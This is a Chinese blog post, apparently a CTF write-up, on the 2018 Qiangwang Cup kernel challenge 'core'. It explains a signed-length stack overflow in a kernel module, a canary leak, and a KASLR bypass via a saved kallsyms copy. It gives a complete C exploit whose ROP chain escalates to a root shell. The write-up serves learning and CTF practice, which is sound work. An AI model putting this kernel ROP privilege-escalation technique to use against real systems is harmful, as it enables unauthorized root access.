@@ -1,0 +1,148 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>强网杯2018-CORE-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="这道题是一个 KERNEL 下的 ROP，其实和用户态下的差别也不是特别大，但是调试不是很方便，有地方出现错误，基本上就会造成 qemu 的重启，会浪费很多时间。 start.sh 脚"><meta property="og:image" content><meta property="og:title" content="强网杯2018-CORE-WP"><meta property="og:description" content="这道题是一个 KERNEL 下的 ROP，其实和用户态下的差别也不是特别大，但是调试不是很方便，有地方出现错误，基本上就会造成 qemu 的重启，会浪费很多时间。 start.sh 脚"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1417.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-06-20T14:53:00+00:00"><meta property="article:modified_time" content="2021-06-20T14:53:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="强网杯2018-CORE-WP"><meta name=twitter:description content="这道题是一个 KERNEL 下的 ROP，其实和用户态下的差别也不是特别大，但是调试不是很方便，有地方出现错误，基本上就会造成 qemu 的重启，会浪费很多时间。 start.sh 脚"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>强网杯2018-CORE-WP</h1><div class=meta>Posted on Jun 20, 2021</div></div><section class=body><p>这道题是一个 KERNEL 下的 ROP，其实和用户态下的差别也不是特别大，但是调试不是很方便，有地方出现错误，基本上就会造成 qemu 的重启，会浪费很多时间。</p><p>start.sh 脚本中的启动命令和参数为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ cat start.sh 
+</span></span><span style=display:flex><span>qemu-system-x86_64 <span style=color:#4070a0;font-weight:700>\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>-m 64M <span style=color:#4070a0;font-weight:700>\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>-kernel ./bzImage <span style=color:#4070a0;font-weight:700>\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>-initrd  ./core.cpio <span style=color:#4070a0;font-weight:700>\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>-append <span style=color:#4070a0>&#34;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&#34;</span> <span style=color:#4070a0;font-weight:700>\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>-netdev user,id<span style=color:#666>=</span>t0, -device e1000,netdev<span style=color:#666>=</span>t0,id<span style=color:#666>=</span>nic0 <span style=color:#4070a0;font-weight:700>\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>-nographic
+</span></span></code></pre></div><p>直接跑干脆跑不起来，从保存信息中可以看出是内存太小了，把它改成 256M 后我就可以起了。</p><p>同时注意到参数中挂了 kaslr。</p><p>解压后，首先看一下 init 脚本</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#007020>#!/bin/sh
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>mount -t proc proc /proc
+</span></span><span style=display:flex><span>mount -t sysfs sysfs /sys
+</span></span><span style=display:flex><span>mount -t devtmpfs none /dev
+</span></span><span style=display:flex><span>/sbin/mdev -s
+</span></span><span style=display:flex><span>mkdir -p /dev/pts
+</span></span><span style=display:flex><span>mount -vt devpts -o <span style=color:#bb60d5>gid</span><span style=color:#666>=</span>4,mode<span style=color:#666>=</span><span style=color:#40a070>620</span> none /dev/pts
+</span></span><span style=display:flex><span>chmod <span style=color:#40a070>666</span> /dev/ptmx
+</span></span><span style=display:flex><span>cat /proc/kallsyms &gt; /tmp/kallsyms
+</span></span><span style=display:flex><span><span style=color:#007020>echo</span> <span style=color:#40a070>1</span> &gt; /proc/sys/kernel/kptr_restrict
+</span></span><span style=display:flex><span><span style=color:#007020>echo</span> <span style=color:#40a070>1</span> &gt; /proc/sys/kernel/dmesg_restrict
+</span></span><span style=display:flex><span>ifconfig eth0 up
+</span></span><span style=display:flex><span>udhcpc -i eth0
+</span></span><span style=display:flex><span>ifconfig eth0 10.0.2.15 netmask 255.255.255.0
+</span></span><span style=display:flex><span>route add default gw 10.0.2.2 
+</span></span><span style=display:flex><span>insmod /core.ko
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>setsid /bin/cttyhack setuidgid <span style=color:#40a070>1000</span> /bin/sh
+</span></span><span style=display:flex><span><span style=color:#007020>echo</span> <span style=color:#4070a0>&#39;sh end!\n&#39;</span>
+</span></span><span style=display:flex><span>umount /proc
+</span></span><span style=display:flex><span>umount /sys
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>poweroff -d <span style=color:#40a070>0</span>  -f
+</span></span></code></pre></div><p>可以看到比较重要的是</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>cat /proc/kallsyms &gt; /tmp/kallsyms
+</span></span><span style=display:flex><span><span style=color:#007020>echo</span> <span style=color:#40a070>1</span> &gt; /proc/sys/kernel/kptr_restrict
+</span></span><span style=display:flex><span><span style=color:#007020>echo</span> <span style=color:#40a070>1</span> &gt; /proc/sys/kernel/dmesg_restrict
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>insmod /core.ko
+</span></span></code></pre></div><p>这四句话，其中中间两句设置了 kptr_restrict 和 dmesg_restrict 两个值为 1，这使得普通用户无法查看 dmesg 和 kallsyms 中的值（kallsyms 中显示会全部为 0）。后置主要影响的是查看与 moudle 相关的调试信息，也就是在 <code>/sys/moudle/core/section</code> 中执行 <code>grep 0 .text</code> 时需要 root 权限。前者则会造成无法直接通过 /proc/kallsyms 来进行 leak kernel 基址。</p><p>由于在执行 <code>echo 1 > /proc/sys/kernel/kptr_restrict</code> 之前就执行了 <code>cat /proc/kallsyms > /tmp/kallsyms</code>，所以我们可以直接通过 /tmp 中的文件来获得内核的基址。为了调试方便，可以本地去掉这两句话或者直接以 root 权限进入虚拟机，这样可以获得 core 的基址。因为我们在利用的时候是不需要查看 core 的基址的，所以在本地去掉这个防护也无伤大雅。</p><p>首先看一下文件操作的虚表</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/06/4001520221.png></div><p>使用 write 可以设置 name，对长度的限制为 0x800</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/06/1480011083.png></div><p>ioctl 定义了三条指令，分别可以进行 read，设置 off 变量，和执行 core_copy_func</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/06/48084028.png></div><p>在 core_copy_func 中，存在一个栈溢出</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/06/3696511772.png></div><p>其中的 qmemcpy 存在一个栈溢出。虽然这里对 a1 进行了检测，但是在检测的时候 a1 为一个有符号的 64 位数，我们使用 <code>(0xFFFFFFFFFFFF0000 | (0x100))</code> 这样的值就可以造成溢出了（注意这里给 a1 低 16 位的值不要太大，不然可能会出现错误）。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/06/2161999518.png></div><p>通过恰当设置 off 的值，在 core_read 中可以 leak 出一些栈上的数据，最重要的就是 canary。</p><p>有栈溢出，又可以 leak 出 canary。虽然开启了 kaslr，但是提供了 kallsyms，可以直接绕过，所以做 rop 即可。我们的目标就是先通过 rop 执行 <code>commit_creds(prepare_kernel_cred(0))</code>，然后返回用户态执行 <code>system("/bin/sh")</code>。</p><p>题目给了一个 vmlinux，这个文件里面有大量的 gadgets（和 bzImage 之类的区别可以参考<a href=https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml>这里</a>），通过 ropper 可以提取</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ropper --file ./vmlinux --nocolor &gt; vmlinux_gadgets
+</span></span></code></pre></div><p>如果出于某些原因需要重新提取一次，ropper 会从 cache 中尝试重新提取，就我的经历而言，从 cache 中提取 ropper 会卡死，所以如果它卡死了，可以用 <code>ropper --clear-cache</code> 来清空 cache。</p><p>然后做 rop 即可，exp 如下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdio.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdlib.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;fcntl.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;unistd.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;string.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>GetRootShell</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;/bin/sh&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/* get user stat*/</span>
+</span></span><span style=display:flex><span>size_t user_cs, user_gs, user_ds, user_es, user_ss, user_rflags, user_rsp;
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>GetUserStat</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	__asm__ (<span style=color:#4070a0>&#34;.intel_syntax noprefix</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>); <span style=color:#60a0b0;font-style:italic>// set intel syntax
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	__asm__ <span style=color:#007020;font-weight:700>volatile</span> (
+</span></span><span style=display:flex><span>		<span style=color:#4070a0>&#34;mov user_cs, cs;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>		 mov user_ss, ss;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>		 mov user_gs, gs;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>		 mov user_ds, ds;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>		 mov user_es, es;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>		 mov user_rsp, rsp;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>		 pushf;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>		 pop user_rflags&#34;</span>
+</span></span><span style=display:flex><span>	);
+</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;[+] got user stat</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>main</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	GetUserStat();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> core_fd <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/proc/core&#34;</span>, <span style=color:#40a070>2</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	ioctl(core_fd, <span style=color:#40a070>0x6677889C</span>, <span style=color:#40a070>0x40</span>);
+</span></span><span style=display:flex><span>	<span style=color:#902000>char</span> leaked_data[<span style=color:#40a070>100</span>];
+</span></span><span style=display:flex><span>	ioctl(core_fd, <span style=color:#40a070>0x6677889B</span>, leaked_data);
+</span></span><span style=display:flex><span>	size_t canary <span style=color:#666>=</span> ((size_t<span style=color:#666>*</span>)leaked_data)[<span style=color:#40a070>0</span>];
+</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;[+] canary = %p</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, canary);
+</span></span><span style=display:flex><span>	size_t core_ioctl_addr <span style=color:#666>=</span> ((size_t<span style=color:#666>*</span>) leaked_data)[<span style=color:#40a070>2</span>] <span style=color:#666>-</span> <span style=color:#40a070>60</span>;
+</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;[+] core_ioctl_addr = %p</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, core_ioctl_addr);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>/* 
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 * &gt;&gt;&gt; print(hex(vmlinux.sym[&#34;commit_creds&#34;] - 0xffffffff81000000))
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 * 0x9c8e0 													  
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 * &gt;&gt;&gt; print(hex(vmlinux.sym[&#34;prepare_kernel_cred&#34;] - 0xffffffff81000000))
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 * 0x9cce0 
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	*/</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	FILE<span style=color:#666>*</span> kallsym <span style=color:#666>=</span> fopen(<span style=color:#4070a0>&#34;/tmp/kallsyms&#34;</span>, <span style=color:#4070a0>&#34;r&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (kallsym <span style=color:#666>==</span> <span style=color:#007020>NULL</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		printf(<span style=color:#4070a0>&#34;[!] open kallsym failed&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#902000>char</span> sym_info[<span style=color:#40a070>0x40</span>] <span style=color:#666>=</span> {<span style=color:#40a070>0</span>};
+</span></span><span style=display:flex><span>	size_t prepare_kernel_cred_addr <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>	size_t commit_creds_addr <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>	size_t vmlinux_base_addr <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>while</span>(fgets(sym_info, <span style=color:#40a070>0x30</span>, kallsym))
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (strstr(sym_info, <span style=color:#4070a0>&#34;commit_creds&#34;</span>))
+</span></span><span style=display:flex><span>		{
+</span></span><span style=display:flex><span>			<span style=color:#902000>char</span> commit_creds_hex[<span style=color:#40a070>20</span>] <span style=color:#666>=</span> {<span style=color:#40a070>0</span>};
+</span></span><span style=display:flex><span>			strncpy(commit_creds_hex, sym_info, <span style=color:#40a070>16</span>);
+</span></span><span style=display:flex><span>			sscanf(commit_creds_hex, <span style=color:#4070a0>&#34;%llx&#34;</span>, <span style=color:#666>&amp;</span>commit_creds_addr);
+</span></span><span style=display:flex><span>			vmlinux_base_addr <span style=color:#666>=</span> commit_creds_addr <span style=color:#666>-</span> <span style=color:#40a070>0x9C8E0</span>;
+</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>break</span>;
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;[+] vmlinux_base_addr = %p</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, vmlinux_base_addr);
+</span></span><span style=display:flex><span>	prepare_kernel_cred_addr <span style=color:#666>=</span> vmlinux_base_addr <span style=color:#666>+</span> <span style=color:#40a070>0x9CCE0</span>;
+</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;[+] commit_creds_addr = %p</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, commit_creds_addr);
+</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;[+] prepare_kernel_cred_addr = %p</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, prepare_kernel_cred_addr);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	size_t rop_chain[<span style=color:#40a070>0x100</span>] <span style=color:#666>=</span> {<span style=color:#40a070>0</span>};
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>9</span>;
+</span></span><span style=display:flex><span>	rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> <span style=color:#40a070>0</span>; <span style=color:#60a0b0;font-style:italic>// rbx pass
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> <span style=color:#40a070>0xb2f</span> <span style=color:#666>+</span> vmlinux_base_addr; <span style=color:#60a0b0;font-style:italic>//pop rdi; ret;
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>	rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> prepare_kernel_cred_addr;
+</span></span><span style=display:flex><span>	rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> <span style=color:#40a070>0x0a0f49</span> <span style=color:#666>+</span> vmlinux_base_addr; <span style=color:#60a0b0;font-style:italic>// pop rdx; ret;
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	<span style=color:#60a0b0;font-style:italic>/* call pushed commit_creds_addr, pop rdx to skip that and ret2commit_creds_addr */</span>
+</span></span><span style=display:flex><span>	rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> <span style=color:#40a070>0x0a0f49</span> <span style=color:#666>+</span> vmlinux_base_addr; <span style=color:#60a0b0;font-style:italic>// pop rdx; ret; 
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> <span style=color:#40a070>0x01aa6a</span> <span style=color:#666>+</span> vmlinux_base_addr; <span style=color:#60a0b0;font-style:italic>// mov rdi, rax; call rdx;
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> commit_creds_addr;
+</span></span><span style=display:flex><span>	rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> <span style=color:#40a070>0xa012da</span> <span style=color:#666>+</span> vmlinux_base_addr; <span style=color:#60a0b0;font-style:italic>// swapgs; popfq; ret;
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>	rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> <span style=color:#40a070>0x050ac2</span> <span style=color:#666>+</span> vmlinux_base_addr; <span style=color:#60a0b0;font-style:italic>// iretq; ret;
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> GetRootShell;
+</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>/* return from INT */</span>
+</span></span><span style=display:flex><span>	rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> user_cs;
+</span></span><span style=display:flex><span>	rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> user_rflags;
+</span></span><span style=display:flex><span>	rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> user_rsp;
+</span></span><span style=display:flex><span>	rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> user_ss;
+</span></span><span style=display:flex><span>	rop_chain[<span style=color:#40a070>8</span>] <span style=color:#666>=</span> canary;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	write(core_fd, rop_chain, <span style=color:#40a070>0x800</span>);
+</span></span><span style=display:flex><span>	ioctl(core_fd, <span style=color:#40a070>0x6677889A</span>, <span style=color:#40a070>0xFFFFFFFFFFFF0100</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>注意由于我比较熟悉 Intel 语法，所以这里内联汇编用的也是 Intel 语法，编译时要加上 <code>-masm=intel</code> 这个参数。<code>__asm__ (".intel_syntax noprefix\n");</code> 这句是设置内联汇编语法为 Intel 语法。</p></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
